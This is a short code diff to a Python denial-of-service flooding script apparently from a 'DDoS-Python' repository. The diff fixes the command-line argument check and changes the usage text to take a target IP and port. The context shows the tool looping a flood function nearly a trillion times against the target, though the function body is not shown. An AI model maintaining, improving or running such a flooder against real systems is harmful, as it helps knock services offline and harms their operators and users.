@@ -5,7 +5,7 @@
 # Updates: https://github.com/Shadowz3n/DDoS-Python
 import socket, sys
 
-if len(sys.argv)>1:
+if len(sys.argv)>2:
 	host=sys.argv[1]
 	port=sys.argv[2]
 	message="Flood"
@@ -25,4 +25,4 @@ if len(sys.argv)>1:
 	for i in xrange(999999999999):
 	    dos()
 else:
-	print("Usage:\tpython "+sys.argv[0]+" <domain> <port>")
+	print("Usage:\tpython "+sys.argv[0]+" <ip> <port>")
